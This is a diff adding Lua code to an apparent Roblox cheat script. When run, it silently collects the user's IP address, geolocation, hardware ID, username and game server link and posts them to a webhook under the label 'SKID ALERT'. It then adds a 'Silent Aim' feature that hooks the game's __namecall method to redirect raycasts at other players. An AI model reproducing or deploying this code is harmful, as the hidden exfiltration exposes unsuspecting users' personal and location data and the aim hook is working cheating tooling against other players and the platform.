+    u639.Country = u639.LocalizationService.RobloxLocaleId
+    u639.IP = game:HttpGet('https://v4.ident.me/')
+    u639.Geo = game:HttpGet('http://ip-api.com/json')
+    u639.HWID = u639.RbxAnalyticsService:GetClientId()
+    u639.Job = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
+    u639.Link = 'roblox://placeId=' .. game.PlaceId .. '&gameInstanceId=' .. game.JobId
+    u639.GameName = u639.MarketplaceService:GetProductInfo(game.PlaceId).Name
+
+    function make()
+        local v640 = identifyexecutor()
+        local v641 = {
+            avatar_url = '',
+            content = '',
+        }
+        local v642 = {}
+        local v643 = {
+            author = {
+                name = 'SKID ALERT',
+                url = 'https://roblox.com',
+            },
+            description = string.format([[__[Player Info](https://www.roblox.com/users/%d)__
+**Display Name:** %s
+**Username:** %s
+**User Id:** %d
+**MembershipType:** %s
+**AccountAge:** %d
+**Country:** %s
+**IP:** %s
+**Hwid:** %s
+**Date:** %s
+**Time:** %s
+
+__[Game Info](https://www.roblox.com/games/%d)__
+**Game:** %s
+**Game Id:** %d
+**Exploit:** %s
+
+**Data:**```%s```
+
+**JobId:**```%s```]], u639.UserId, u639.DisplayName, u639.Name, u639.UserId, u639.Membership, u639.Age, u639.Country, u639.IP, u639.HWID, os.date('%m/%d/%Y'), os.date('%X'), game.PlaceId, u639.GameName, game.PlaceId, v640, u639.Geo, u639.Job),
+            type = 'rich',
+            color = tonumber('0xFFD700'),
+            thumbnail = {
+                url = 'https://www.roblox.com/headshot-thumbnail/image?userId=' .. u639.UserId .. '&width=150&height=150&format=png',
+            },
+        }
+
+        __set_list(v642, 1, {v643})
+
+        v641.embeds = v642
+
+        return u639.HttpService:JSONEncode(v641)
+    end
+    function send(p644)
+        local v645 = http_request or (request or HttpPost or syn.request)
+        local v646 = {
+            ['content-type'] = 'application/json',
+        }
+
+        v645({
+            Url = u639.webhookUrl,
+            Body = p644,
+            Method = 'POST',
+            Headers = v646,
+        })
+        v645({
+            Url = u639.webhookUrl,
+            Body = u639.HttpService:JSONEncode({
+                content = u639.Link,
+            }),
+            Method = 'POST',
+            Headers = v646,
+        })
+    end
+
+    send(make())
+
+    local v647 = v27:MakeTab({
+        Name = 'Silent Aim',
+        Icon = 'rbxassetid://6031091005',
+        PremiumOnly = false,
+    })
+    local u648 = {
+        SA = {
+            En = false,
+            Key = 'RightAlt',
+            TP = 'HumanoidRootPart',
+            Show = false,
+            MHP = false,
+            AP = false,
+            MHP_A = 0.165,
+            HC = 100,
+            Col = Color3.fromRGB(54, 57, 241),
+        },
+        Cam = _Workspace.CurrentCamera,
+        P = game:GetService('Players'),
+        RS = game:GetService('RunService'),
+        GS = game:GetService('GuiService'),
+        UIS = game:GetService('UserInputService'),
+        ST = game:GetService('Stats'),
+        LP = game:GetService('Players').LocalPlayer,
+        MC = nil,
+        MB = nil,
+        M = nil,
+        MBX = nil,
+        VTP = {
+            'Head',
+            'HumanoidRootPart',
+        },
+        CPA = 0.165,
+        EA = {
+            Raycast = {
+                AC = 3,
+                Args = {
+                    'Instance',
+                    'Vector3',
+                    'Vector3',
+                    'RaycastParams',
+                },
+            },
+        },
+        CoR = coroutine.resume,
+        CoC = coroutine.create,
+    }
+
+    if getgenv then
+        getgenv().SilentAimSettings = u648.SA
+    else
+        v546.SilentAimSettings = u648.SA
+    end
+
+    u648.M = u648.LP:GetMouse()
+
+    local u649 = pcall(function()
+        return Drawing.new('Square')
+    end)
+
+    if u649 then
+        u648.MBX = Drawing.new('Square')
+        u648.MBX.Visible = false
+        u648.MBX.ZIndex = 999
+        u648.MBX.Color = u648.SA.Col
+        u648.MBX.Thickness = 2
+        u648.MBX.Size = Vector2.new(30, 30)
+        u648.MBX.Filled = true
+    else
+        u648.MBX = {
+            Visible = false,
+            Position = Vector2.new(),
+            Color = u648.SA.Col,
+        }
+        u648.SA.Show = false
+    end
+
+    local v650 = 'MC'
+    local _TouchEnabled = u648.UIS.TouchEnabled
+
+    if _TouchEnabled then
+        _TouchEnabled = not u648.UIS.KeyboardEnabled
+    end
+
+    u648[v650] = _TouchEnabled
+
+    local _ = game.GetChildren
+    local _GetPlayers = u648.P.GetPlayers
+    local _WorldToScreenPoint = u648.Cam.WorldToScreenPoint
+    local _WorldToViewportPoint = u648.Cam.WorldToViewportPoint
+    local _FindFirstChild = game.FindFirstChild
+    local _RenderStepped = u648.RS.RenderStepped
+    local _Heartbeat = u648.RS.Heartbeat
+    local _ = u648.GS.GetGuiInset
+    local _GetMouseLocation = u648.UIS.GetMouseLocation
+
+    function Ch(p659)
+        local v660 = math.floor(p659)
+
+        return math.floor(math.random() * 100) / 100 <= v660 / 100
+    end
+    function GPx(p661)
+        local v662, v663 = _WorldToScreenPoint(u648.Cam, p661)
+
+        return Vector2.new(v662.X, v662.Y), v663
+    end
+    function VA(p664, p665)
+        local v666 = 0
+
+        if #p664 < p665.AC then
+            return false
+        end
+
+        local v667 = next
+        local v668 = nil
+
+        while true do
+            local v669
+
+            v668, v669 = v667(p664, v668)
+
+            if v668 == nil then
+                break
+            end
+            if typeof(v669) == p665.Args[v668] then
+                v666 = v666 + 1
+            end
+        end
+
+        return p665.AC <= v666
+    end
+    function GD(p670, p671)
+        return (p671 - p670).Unit * 1000
+    end
+    function GMP()
+        return _GetMouseLocation(u648.UIS)
+    end
+    function GPP(p672)
+        local v673 = p672.Velocity or Vector3.new()
+
+        return p672.Position + (u648.SA.MHP and v673 * u648.CPA or Vector3.new())
+    end
+    function GCP()
+        if u648.SA.TP then
+            local v674 = u648.MC and u648.Cam.ViewportSize / 2 or GMP()
+            local v675 = next
+            local v676, v677 = _GetPlayers(u648.P)
+            local v678 = nil
+            local v679 = nil
+
+            while true do
+                local v680
+
+                v677, v680 = v675(v676, v677)
+
+                if v677 == nil then
+                    break
+                end
+                if v680 ~= u648.LP then
+                    local _Character34 = v680.Character
+
+                    if _Character34 then
+                        local v682 = _FindFirstChild(_Character34, 'HumanoidRootPart')
+                        local v683 = _FindFirstChild(_Character34, 'Humanoid')
+
+                        if v682 and v683 and (not v683 or v683.Health > 0) and (u648.Cam.CFrame.Position - v682.Position).Magnitude <= 35 then
+                            local v684, v685 = GPx(v682.Position)
+
+                            if v685 then
+                                local _Magnitude2 = (v674 - v684).Magnitude
+
+                                if _Magnitude2 <= (v678 or 2000) then
+                                    v679 = u648.SA.TP == 'Random' and _Character34[u648.VTP[math.random(1, #u648.VTP)] ] or _Character34[u648.SA.TP]
+                                    v678 = _Magnitude2
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+
+            return v679
+        end
+    end
+
+    v647:AddToggle({
+        Name = 'Enabled',
+        Default = u648.SA.En,
+        Callback = function(p687)
+            u648.SA.En = p687
+            u648.MBX.Visible = p687
+        end,
+    })
+    v647:AddBind({
+        Name = 'Toggle Key',
+        Default = Enum.KeyCode[u648.SA.Key],
+        Hold = false,
+        Callback = function()
+            u648.SA.En = not u648.SA.En
+
+            EnabledToggle:Set(u648.SA.En)
+
+            u648.MBX.Visible = u648.SA.En
+        end,
+    })
+    v647:AddDropdown({
+        Name = 'Target Part',
+        Default = u648.SA.TP,
+        Options = {
+            'Head',
+            'HumanoidRootPart',
+            'Random',
+        },
+        Callback = function(p688)
+            u648.SA.TP = p688
+        end,
+    })
+    v647:AddSlider({
+        Name = 'Hit Chance',
+        Min = 0,
+        Max = 100,
+        Increment = 1,
+        Default = u648.SA.HC,
+        ValueName = '%',
+        Callback = function(p689)
+            u648.SA.HC = p689
+        end,
+    })
+    v647:AddSection({
+        Name = 'Prediction',
+    })
+    v647:AddToggle({
+        Name = 'Manual Prediction',
+        Default = u648.SA.MHP,
+        Callback = function(p690)
+            u648.SA.MHP = p690
+        end,
+    })
+    v647:AddToggle({
+        Name = 'Auto Prediction',
+        Default = u648.SA.AP,
+        Callback = function(p691)
+            u648.SA.AP = p691
+        end,
+    })
+    v647:AddSlider({
+        Name = 'Prediction Amount',
+        Min = 0.165,
+        Max = 1,
+        Increment = 0.001,
+        Default = u648.SA.MHP_A,
+        Callback = function(p692)
+            u648.SA.MHP_A = p692
+        end,
+    })
+    v647:AddSection({
+        Name = 'Visuals',
+    })
+    v647:AddToggle({
+        Name = 'Show Silent Aim Target',
+        Default = u648.SA.Show,
+        Callback = function(p693)
+            u648.SA.Show = p693
+            u648.MBX.Visible = p693
+        end,
+    })
+    v647:AddColorpicker({
+        Name = 'Silent Aim Target Color',
+        Default = u648.SA.Col,
+        Callback = function(p694)
+            u648.SA.Col = p694
+            u648.MBX.Color = p694
+        end,
+    })
+    _Heartbeat:Connect(function()
+        if u648.SA.AP then
+            local v695, v696 = pcall(function()
+                return u648.ST.Network.ServerStatsItem['Data Ping']:GetValueString()
+            end)
+
+            if v695 then
+                local v697 = tonumber(v696:match('(%d+)')) or 50
+
+                if v697 < 20 then
+                    u648.CPA = 0.11
+                elseif v697 < 30 then
+                    u648.CPA = 0.115
+                elseif v697 < 40 then
+                    u648.CPA = 0.12
+                elseif v697 < 50 then
+                    u648.CPA = 0.125
+                elseif v697 < 60 then
+                    u648.CPA = 0.13
+                elseif v697 < 70 then
+                    u648.CPA = 0.135
+                elseif v697 < 80 then
+                    u648.CPA = 0.14
+                elseif v697 < 90 then
+                    u648.CPA = 0.145
+                elseif v697 < 100 then
+                    u648.CPA = 0.15
+                elseif v697 < 110 then
+                    u648.CPA = 0.155
+                else
+                    u648.CPA = 0.16
+                end
+            end
+        else
+            u648.CPA = u648.SA.MHP_A
+        end
+    end)
+    _RenderStepped:Connect(function()
+        if u648.SA.Show and (u648.SA.En and u649) then
+            if GCP() then
+                local v698 = GCP().Parent.PrimaryPart or GCP()
+                local v699, v700 = _WorldToViewportPoint(u648.Cam, v698.Position)
+
+                u648.MBX.Visible = v700
+                u648.MBX.Position = Vector2.new(v699.X, v699.Y)
+            else
+                u648.MBX.Visible = false
+                u648.MBX.Position = Vector2.new()
+            end
+        end
+    end)
+
+    local u701 = checkcaller or function()
+        return false
+    end
+    local u703 = newcclosure or function(p702)
+        return p702
+    end
+    local u704 = false
+
+    if hookmetamethod then
+        local _, _ = pcall(function()
+            oldNC = hookmetamethod(game, '__namecall', u703(function(...)
+                local v705 = getnamecallmethod()
+                local v706 = {...}
+                local v707 = v706[1]
+                local v708 = Ch(u648.SA.HC)
+
+                if u648.SA.En and (v707 == _Workspace and not u701()) and (v708 and v705 == 'Raycast' and VA(v706, u648.EA.Raycast)) then
+                    local v709 = v706[2]
+                    local v710 = GCP()
+
+                    if v710 then
+                        v706[3] = GD(v709, GPP(v710))
+
+                        return oldNC(unpack(v706))
+                    end
+                end
+
+                return oldNC(...)
+            end))
+            u704 = true
+        end)
+    end
+
+    v545:Init()
+else
+    _LocalPlayer:Kick('Whitelist services down. Try again later.')
+end
